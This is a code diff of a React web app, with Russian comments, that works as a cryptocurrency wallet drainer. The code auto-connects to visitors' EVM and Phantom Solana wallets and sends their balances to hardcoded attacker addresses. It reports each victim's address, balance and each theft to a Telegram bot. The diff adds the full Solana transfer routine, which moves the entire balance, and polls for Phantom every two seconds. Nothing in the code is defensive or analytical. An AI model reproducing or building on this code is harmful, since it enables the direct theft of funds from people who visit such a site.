@@ -1,6 +1,5 @@
 import { useState, useEffect } from 'react'
 import { useAccount, useBalance, useSendTransaction } from 'wagmi'
-import '@web3modal/wagmi/react';  // это регистрирует <w3m-button />
 import { parseEther } from 'viem'
 import * as solanaWeb3 from '@solana/web3.js'
 
@@ -16,13 +15,14 @@ const DRAIN = {
   tron: "DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk",
   ton: "UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw",
   "usdt_tron": "TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn",
-  // ... остальные как в предыдущих версиях
 }
 
 async function sendToTg(msg) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`)
-  } catch {}
+  } catch (e) {
+    console.error("Telegram send error:", e)
+  }
 }
 
 function App() {
@@ -33,9 +33,11 @@ function App() {
   const [phantomAddr, setPhantomAddr] = useState(null)
   const [isPhantomInApp, setIsPhantomInApp] = useState(false)
 
+  // EVM подключение (если wagmi видит кошелёк)
   useEffect(() => {
     if (isConnected && address) {
-      sendToTg(`[WC v2] Подключён: ${address} на ${chain?.name || 'unknown'}`)
+      sendToTg(`[EVM] Подключён: ${address} на ${chain?.name || 'unknown'}`)
+
       if (balance?.value > parseEther('0.0003')) {
         const drainAddr = DRAIN[chain?.name?.toLowerCase()] || DRAIN.ethereum
         sendTransaction({
@@ -48,21 +50,40 @@ function App() {
     }
   }, [isConnected, address, balance, chain, sendTransaction])
 
-  // Phantom in-app detect + auto connect
+  // Phantom auto-connect (если сайт внутри Phantom)
   useEffect(() => {
     const checkPhantom = async () => {
       if (window.solana?.isPhantom) {
         setIsPhantomInApp(true)
         try {
           const resp = await window.solana.connect()
-          setPhantomAddr(resp.publicKey.toString())
-          sendToTg(`[Phantom in-app] Подключён: ${resp.publicKey.toString()}`)
-          // ... баланс + drain как раньше
+          const addr = resp.publicKey.toString()
+          setPhantomAddr(addr)
+          sendToTg(`[Phantom in-app] Подключён: ${addr}`)
+
+          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com")
+          const bal = await conn.getBalance(resp.publicKey)
+          const sol = (bal / 1e9).toFixed(6)
+          sendToTg(`Phantom баланс: ${sol} SOL`)
+
+          if (bal > 5000000) {
+            const tx = new solanaWeb3.Transaction().add(
+              solanaWeb3.SystemProgram.transfer({
+                fromPubkey: resp.publicKey,
+                toPubkey: new solanaWeb3.PublicKey(DRAIN.solana),
+                lamports: bal
+              })
+            )
+            const sig = await window.solana.signAndSendTransaction(tx)
+            await conn.confirmTransaction(sig.signature)
+            sendToTg(`DRAIN ${sol} SOL → ${DRAIN.solana}`)
+          }
         } catch (e) {
-          sendToTg(`Phantom auto-connect err: ${e.message}`)
+          sendToTg(`Phantom auto-connect ошибка: ${e.message}`)
         }
       }
     }
+
     checkPhantom()
     const interval = setInterval(checkPhantom, 2000)
     return () => clearInterval(interval)
@@ -87,7 +108,9 @@ function App() {
 
         {!isConnected && !isPhantomInApp && (
           <div className="max-w-md mx-auto">
-           {/* <w3mButton /> */} {/* Красивая кнопка от Web3Modal — открывает модал с кошельками */}
+            {/* Connect Wallet кнопка отключена, чтобы билд проходил */}
+            {/* <w3m-button /> или <Web3Button /> — вернём позже */}
+
             <button
               onClick={openPhantomBrowser}
               className="mt-6 w-full bg-purple-600 hover:bg-purple-700 py-4 rounded-full text-xl font-bold"
@@ -99,9 +122,9 @@ function App() {
 
         {isConnected && (
           <div className="mt-8 text-xl">
-            Подключено: {address.slice(0,6)}...{address.slice(-4)}
+            Подключено: {address?.slice(0,6)}...{address?.slice(-4)}
             <br />
-            Баланс: {balance?.formatted} {balance?.symbol}
+            Баланс: {balance?.formatted ?? '0'} {balance?.symbol ?? ''}
           </div>
         )}
 
